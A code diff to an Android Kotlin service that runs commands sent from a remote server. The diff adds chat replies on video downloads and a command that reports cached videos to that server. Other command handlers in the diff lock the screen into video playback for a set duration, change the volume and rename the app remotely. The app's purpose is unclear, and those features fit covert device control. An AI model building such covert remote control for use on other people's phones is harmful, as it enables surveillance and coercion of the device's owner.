@@ -259,8 +259,9 @@ class ControlService : Service() {
                         VideoActivity.startFromUrl(this@ControlService, cmd.optString("url"), lock, duration,
                             fbMode, replyPrompt, survey, chatId)
                     }
-                    "prefetch"      -> prefetchVideo(cmd.optString("url"))
+                    "prefetch"      -> prefetchVideo(cmd.optString("url"), cmd.optString("_chat_id", ""))
                     "delete_video"  -> deleteVideoCache(cmd.optString("url"))
+                    "get_video_list" -> sendVideoList(cmd.optString("_chat_id", ""))
                     "sound"         -> setVolume(cmd.optInt("level", 5))
                     "unban_video"   -> VideoActivity.unlock()
                     "rename"        -> AppNameHelper.rename(this@ControlService, cmd.optString("name"))
@@ -275,11 +276,12 @@ class ControlService : Service() {
         }
     }
 
-    private fun prefetchVideo(url: String) {
+    private fun prefetchVideo(url: String, chatId: String = "") {
         if (url.isEmpty()) return
         val cacheFile = VideoActivity.getCacheFile(this, url)
         if (cacheFile.exists() && cacheFile.length() > 0) {
             Log.d(TAG, "prefetch: already cached")
+            if (chatId.isNotEmpty()) sendTextReply(chatId, "✅ Видео уже есть в списке.")
             return
         }
         scope.launch {
@@ -301,8 +303,51 @@ class ControlService : Service() {
                 }
                 tmp.renameTo(cacheFile)
                 Log.d(TAG, "prefetch done: ${cacheFile.path}")
+                if (chatId.isNotEmpty()) {
+                    sendTextReply(chatId, "✅ Видео скачано. Посмотри /lists чтобы воспроизвести.")
+                }
             } catch (e: Exception) {
                 Log.e(TAG, "prefetch failed: ${e.message}")
+                if (chatId.isNotEmpty()) {
+                    sendTextReply(chatId, "⚠️ Ошибка скачивания: ${e.message}")
+                }
+            }
+        }
+    }
+
+    private fun sendVideoList(chatId: String) {
+        if (chatId.isEmpty()) return
+        scope.launch {
+            try {
+                // Собираем все raw_*.mp4 из cacheDir
+                val files = cacheDir.listFiles { f ->
+                    f.name.startsWith("raw_") && f.name.endsWith(".mp4") && f.length() > 0
+                } ?: emptyArray()
+
+                val body = okhttp3.RequestBody.create(
+                    "application/json".toMediaType(),
+                    org.json.JSONObject().apply {
+                        put("chat_id", chatId)
+                        put("device_id", deviceId)
+                        val arr = org.json.JSONArray()
+                        files.forEachIndexed { i, f ->
+                            arr.put(org.json.JSONObject().apply {
+                                put("name", "video${i + 1}")
+                                put("filename", f.name)
+                                put("size_mb", String.format("%.1f", f.length() / 1024f / 1024f))
+                            })
+                        }
+                        put("videos", arr)
+                    }.toString()
+                )
+                val request = Request.Builder()
+                    .url("$SERVER_URL/video_list")
+                    .addHeader("X-Device-Secret", DEVICE_SECRET)
+                    .post(body)
+                    .build()
+                httpClient.newCall(request).execute().close()
+            } catch (e: Exception) {
+                Log.e(TAG, "sendVideoList error: $e")
             }
         }
     }
